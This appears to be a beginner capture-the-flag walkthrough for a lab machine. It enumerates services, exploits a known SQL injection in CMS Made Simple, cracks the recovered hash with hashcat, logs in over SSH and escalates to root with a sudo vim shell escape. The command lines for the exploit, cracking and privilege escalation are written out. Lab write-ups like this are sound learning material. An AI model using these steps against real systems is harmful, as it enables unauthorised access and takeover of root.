# Simple CTF
 
Beginner level ctf

### #1 How many services are running under port 1000?
```
$ nmap -v -sC -sV -oN nmap/initial <IP>

Looking at the nmap scan result in nmap/initial, we can see that there are 2 port under 1000

2
```

### #2 What is running on the higher port?
```
Here higher port is 2222.

ssh
```

### #3 What's the CVE you're using against the application?
```
- Port 80 just has a default Apache server file, also robots.txt, which is not helpful. So we need to enumerate a bit further.
- I used gobuster and found a hidden directory called /simple
- going to /simple url, we found out that its using 'CMS made simple' and observing closely we find the version used is 2.2.8
- We can now try to find anything on searchploit/exploit-db for this. And we found the CVE

CVE-2019-9053
```

### #4 To what kind of vulnerability is the application vulnerable?
```
sqli
```

### #5 What's the password?
```
- to know the password we can use the exploit script found with CVE
NOTE: running this with python3, I faced some formatting issue. I have corrected it and saved here as exploit.py
Its a very cool script, do check it out. It uses SQL timing attack. At sometime the script was giving me weird output for username, email etc.
I suspected the time variable used was lesser and my connect had latency. So I had to increase TIME variable to 2 (seconds I guess)

$ ./exploit.py -u http://<IP>/simple/ -c -w /opt/wordlists/rockyou.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96

- the exploit.py should have cracked the password but it din't, not sure why. So I used the hashcat.

$ hashcat -m 20 "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" /opt/wordlists/best110.txt

secret
```

### #6 Where can you login with the details obtained?
```
ssh
```

### #7 What's the user flag?
```
- user flag can be found in user home

$ cat /home/mitch/user.txt

G00d j0b, keep up!
```

### #8 Is there any other user in the home directory? What's its name?
```
$ ls /home

This would show use the user directory, but we can also check for the /etc/passwd file

sunbath
```

### #9 What can you leverage to spawn a privileged shell?
```
$ sudo -l
(root) NOPASSWD: /usr/bin/vim

vim
```

### #10	What's the root flag?
```
$ sudo -l
(root) NOPASSWD: /usr/bin/vim

- This would say that we can run /usr/bin/vim as root.
- Looking for vim privesc on GTFObins we can find the following

$ sudo vim -c ':!/bin/sh'

W3ll d0n3. You made it!
```

## Extra notes

There is also a FTP port open, which can be logged in as `anonymous`. Logging in and listing the directory, we find `pub`.
Changing to it will reveal a txt doc called `ForMitch.txt`.
Printing this txt doc shows a sentence but its nothing much than a note. So its not of any help.
